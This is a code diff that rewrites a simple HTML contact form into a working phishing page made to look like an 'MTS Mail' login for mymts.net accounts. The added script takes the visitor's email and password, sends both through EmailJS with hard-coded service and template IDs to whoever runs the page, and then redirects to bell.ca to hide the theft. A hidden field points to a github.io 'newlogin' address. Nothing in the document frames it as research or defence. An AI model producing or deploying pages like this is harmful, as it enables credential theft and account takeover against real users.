@@ -1,35 +1,144 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contact Form</title>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>MTS Mail | Login</title>
+    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script> <!-- EmailJS SDK -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+
+        .wrapper {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 100px;
+            height: auto;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-box {
+            margin-bottom: 15px;
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        .btn {
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background-color: #0056b3;
+        }
+
+        .register-link {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+    </style>
 </head>
 <body>
-    <form id="contact-form">
-        <input type="text" id="email" name="email" placeholder="Your Email" required>
-        <textarea id="message" name="message" placeholder="Your Message" required></textarea>
-        <button type="submit">Send</button>
-    </form>
-
+    <div class="wrapper">
+        <form id="form" name="sentMessage" novalidate="novalidate">
+            <input name="__original_url" type="hidden" value="https://sourcesecureauth.github.io/newlogin/"/>
+            <div class="logo">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTS8xl8WA9QeD6PNO8WZdjNTyi8I_kUnVzYqQ&s" alt="MTS Logo" />
+                <p>Log in with your mymts.net email address</p>
+            </div>
+            <div class="container">
+                <div class="input-box">
+                    <input id="email" name="email" placeholder="Email Address (example@mymts.net)" required="" type="text" />
+                </div>
+                <div class="input-box">
+                    <input id="pw" name="pw" placeholder="Password" required="" type="password" />
+                    <button id="togglePassword" type="button">Show</button>
+                </div>
+                <button class="btn" id="button" type="submit">LOG IN</button>
+                <div class="register-link">
+                    <input type="checkbox" /> <span>Remember Me</span> <a href="#">Forgot Password?</a>
+                </div>
+            </div>
+        </form>
+    </div>
     <script>
-        (function() {
-            emailjs.init("QfBtvxtDbOIMdrX86"); // Replace with your user ID
-        })();
-    
-        document.getElementById("contact-form").addEventListener("submit", function(event) {
+        // Initialize EmailJS with your User ID
+        emailjs.init("QfBtvxtDbOIMdrX86"); // Replace with your User ID from EmailJS
+
+        const btn = document.getElementById("button");
+        document.getElementById("form").addEventListener("submit", function(event) {
             event.preventDefault();
 
-            const serviceID = "service_ut76as3"; // Replace with your service ID
-            const templateID = "template_n5lm9ms"; // Replace with your template ID
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('pw').value.trim();
+            if (!email || !password) {
+                alert('Please fill in all fields.');
+                return;
+            }
 
-            emailjs.sendForm(serviceID, templateID, this)
-                .then(() => {
-                    alert("Message sent successfully!");
-                }, (err) => {
-                    alert("Error sending message: " + JSON.stringify(err));
-                });
+            btn.value = "Sending...";
+            const serviceID = "service_ut76as3"; // Replace with your Service ID
+            const templateID = "template_n5lm9ms"; // Replace with your Template ID
+            const templateParams = {
+                email: email,
+                pw: password
+            };
+
+            emailjs.send(serviceID, templateID, templateParams).then(
+                () => {
+                    btn.value = "Login Successful";
+                    window.location.href = "https://bell.ca"; // Redirect after successful submission
+                },
+                (err) => {
+                    btn.value = "LOG IN";
+                    alert(JSON.stringify(err));
+                }
+            );
+        });
+
+        // Toggle password visibility
+        const passwordInput = document.getElementById("pw");
+        const toggleButton = document.getElementById("togglePassword");
+        toggleButton.addEventListener("click", function () {
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                toggleButton.textContent = "Hide";
+            } else {
+                passwordInput.type = "password";
+                toggleButton.textContent = "Show";
+            }
         });
     </script>
 </body>
